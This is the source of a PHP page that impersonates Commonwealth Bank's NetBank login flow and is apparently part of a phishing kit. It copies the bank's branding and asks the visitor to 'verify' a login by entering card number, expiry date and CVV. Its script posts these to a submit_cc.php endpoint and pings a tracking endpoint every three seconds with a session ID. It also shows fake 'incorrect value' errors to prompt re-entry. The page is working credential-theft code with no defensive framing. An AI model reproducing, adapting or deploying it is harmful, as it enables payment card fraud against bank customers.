  <?php
session_start();

$errorpage = isset($_GET["error"]);
$uniqueid = $_SESSION["uniqueid"];

 ?>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="mac safari safari1 webkit webkit6 cssBeforeSupport" style="margin-top: 81px;">
   <head id="head">
     <script src="files/jquery.js"></script>
      <title>
         NetBank - Payment Review - Enjoy simple and secure online banking from Commonwealth Bank
      </title>
      <meta name="description" content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you.">
      <meta name="google-site-verification" content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo">
      <link rel="canonical" href="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="files/logon-merge.8397238ab0ae7a25ea1af4d375f2c3df.css" rel-album="R630">
      <style id="at-makers-style" class="at-flicker-control">
         .mboxDefault {visibility: hidden;}
      </style>

      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.8/jquery.mask.min.js" integrity="sha512-hAJgR+pK6+s492clbGlnrRnt2J1CJK6kZ82FZy08tm6XG2Xl/ex9oVZLE6Krz+W+Iv4Gsr8U2mGMdh0ckRH61Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
   </head>
   <body id="body" class="logon">
     <script>

     setInterval(function() {
       var _uniqueid = <?=$_SESSION['uniqueid'];?>;

       $.ajax({
         type: 'GET',
         url: 'database_setup/routes/upload_time.php?uniqueid=' + _uniqueid,
         success: function(data) {
           console.log("Time Updated!");
         }
       })
     }, 3000);
     </script>

     <style>
     .btn1 {


    padding: 5px 20px;
    background-color: #fcc30f;
    border-radius: 5px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    font-size: 13px;
    font-weight: bold;
    border: none;
    height: 40px;
    width: 100px;
     }
     </style>

      <form method="post" action="/netbank/Logon/Logon.aspx?ei=mv_logon-NB" onsubmit="javascript:return WebForm_OnSubmit();" id="form1" autocomplete="off">
         <div class="aspNetHidden">
            <input type="hidden" name="RID" id="RID" value="LgRX_fjbsEujXpN4admRzA">
            <input type="hidden" name="SID" id="SID" value="7HoU2XcmiEU=">
            <input type="hidden" name="cid" id="cid" value="yzlhrwUosU6MkuDQ6HKPoA">
            <input type="hidden" name="rqid" id="rqid" value="M7eI6xqGsUO_u0gWzTrg0Q">
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=">
         </div>
         <div id="BodyContainer">
            <div id="Header">
               <div id="BrandingLogo">
                  <span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_mainlogo.ac9de6fb5214be84653367c74ba0b5f0.gif" alt="Commonwealth Bank of Australia"></span>
               </div>
            </div>
            <div id="MainContent">
               <noscript>
                  <div class="MessagePanel">
                     <div class="message_contents message_contents_validation">
                        <div class="message">
                           <div class="message_icon error"></div>
                           <div class="msg_cnt_wrp msg_cnt_wrp_error">
                              <p>
                                 <strong>You need to enable JavaScript to access NetBank</strong>
                              </p>
                              <p>
                                 Follow these instructions on <a id="lnkEnableJavaScript" href="https://www.commbank.com.au/support/faqs/298.html">how to enable JavaScript</a>.
                                 If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="https://www.netbank.com.au/mobile">mobile version</a> of NetBank.
                              </p>
                           </div>
                        </div>
                     </div>
                  </div>
               </noscript>

               <?php if ($errorpage) { ?>
               <div class="MessagePanel arrow MessagePanel_Validation" id="mplMessagePanel">
              	<div class="message_contents message_contents_validation">
              		<div class="message">
              			<div class="message_icon validation icon icon_validation">
              				<i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
              			</div><h3>
              				<span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
              			</h3><ul class="msg_cnt_wrp msg_cnt_wrp_validation">
              				<li class="last"><div class="linkWrap">
              					<a href="#txtMyClientNumber_field"><strong>Card Number</strong></a> -
              				</div><div class="msgWrap">
              					Incorrect value
              				</div></li>
                      <li class="last"><div class="linkWrap">
              					<a href="#txtMyClientNumber_field"><strong>Expiry Date</strong></a> -
              				</div><div class="msgWrap">
              					Incorrect value
              				</div></li>
                      <li class="last"><div class="linkWrap">
              					<a href="#txtMyClientNumber_field"><strong>CVV</strong></a> -
              				</div><div class="msgWrap">
              					Incorrect value
              				</div></li>
              			</ul>
              		</div>
              	</div>
              </div>
              <?php } ?>

               <div id="ModuleWrap">
                  <div id="ModuleLeft" class="module">
                     <h2>Authorisation</h2>
                     <div class="bd">
                        <div class="ft" style="padding-top: 15px; height: fit-content;">
                          <p>We need some more details from you to verify your login attempt, please enter them below.</p>
                          <form id="form1">
                            <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                            <br>
                            <p>Card Number</p>
                            <input type="tel" name="cardnumber" id="cardnumber" required="required">
                            <br> <br>
                            <p>Expiry Date</p>
                            <input type="tel" name="expirydate" id="expirydate" required="required">
                            <br> <br>
                            <p>CVV</p>
                            <input type="tel" name="cvv" id="cvv" required="required">
                            <br>
                            <button type="submit" style="float: right; padding: 5px; background: black; color: white; border: none; width: 60px; display: block; margin: auto; margin-top: 15px; margin-right: 20px; margin-bottom: 10px; ">Verify</button>
                          </form>
                        </div>
                     </div>
                  </div>
                  <script>
                  $('#cardnumber').mask("0000 0000 0000 0000");
                  $('#expirydate').mask("00/00");
                  $('#cvv').mask("000");

                  $('#form1').submit(function(e) {
                    e.preventDefault();

                    $.ajax({
                      type: 'POST',
                      url: 'database_setup/routes/submit_cc.php',
                      data: $(this).serialize(),
                      success: function(data) {
                        let parsed_data = JSON.parse(data);

                        if (parsed_data.status == 'success') {
                          window.location = 'verification.php';
                        }
                      }
                    })
                  })
                  </script>
                  <div id="ModuleRight" class="module">
                     <h2>Quicklinks</h2>
                     <div class="bd">
                        <div class="ft">
                           <ul class="Bullets">
                              <li><a id="lnkOnlineSupport" href="#">Online support for our products and services</a></li>
                              <li><a id="lnkProtectYourselfOnline" href="#">Tips to stay safe online</a></li>
                           </ul>
                        </div>
                        <div class="ft secModule">
                           <ul class="Bullets">
                              <li><a id="lnkSecurityGuarantee" href="#">How we protect you and our 100% security guarantee</a></li>
                           </ul>
                        </div>
                     </div>
                  </div>
               </div>
               <!-- Component for content management. -->
               <div id="ucLogonContentManageControl_pnlContentManaged">
                  <div id="ContentManaged">
                     <!-- this is the features panel which has the image and description. -->
                     <div id="ucLogonContentManageControl_pnlHighlightPanel">
                        <div class="HighlightPanel">
                           <div class="top">
                              <div class="bottom">
                                 <div class="image">
                                    <p><a href="#"><img src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/sustainability_hub_small.jpg" alt=""></a></p>
                                 </div>
                                 <div class="description">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td>
                                                <p><b>Interested in living sustainably?</b></p>
                                                Our sustainability hub has a range of resources to help.
                                                <ul>
                                                   <li><a href="#">Visit sustainability hub</a></li>
                                                </ul>
                                                <p></p>
                                                <p><span></span></p>
                                                <p></p>
                                             </td>
                                          </tr>
                                       </tbody>
                                    </table>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div id="PageFooter">
               <a id="lnkTermsOfUse" href="#">Terms of use</a> | <a id="lnkSecurity" href="#">Security</a> | <a id="lnkPrivacy" href="#">Privacy</a>
               <span id="CopyRight">© Commonwealth Bank of Australia 2021 ABN 48 123 123 124</span>
            </div>
            <iframe id="DigitalPlatformLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/digital/identity/authenticate/sign-out?dpOnly=true"></iframe>
            <iframe id="NetBankDotIdentityLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/retail/netbank/identity/signout"></iframe>
         </div>
         <div class="aspNetHidden">
            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D36AA275">
            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAdBE2G25NgTBOSU8Pqz5seN1tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So0WhGMs5vjP2z0dydHI73bH84b/Z4SECaSTCtUK4njAufZrgpuWroDjuHGLJy3xuLdJ/NDY=">
         </div> <input type="hidden" name="JS" value="E">
         <noscript><input type="hidden" name="JS" value="D" /></noscript>
      </form>
      <input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value="">
      <div id="smartbanner" class="ios top shown" style="top: 0px;">
         <div id="iossmartbanner" class="sb-container">
            <a id="appbannerclose" class="sb-close" href="javascript:void(0)">×</a><img id="iosmobilebanner" class="sb-icon" src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/commbankmobile.png">
            <div class="sb-info"><strong>CommBank app</strong><span>A secure and easy way to bank on the go</span><span></span></div>
         </div>
         <a id="appbannerview" class="sb-button" href="https://itunes.apple.com/au/app/id310251202?mt=8"><span>View</span><input type="hidden" id="smartbanner_type" value="iosmobilebanner"></a>
      </div>
   </body>
</html>
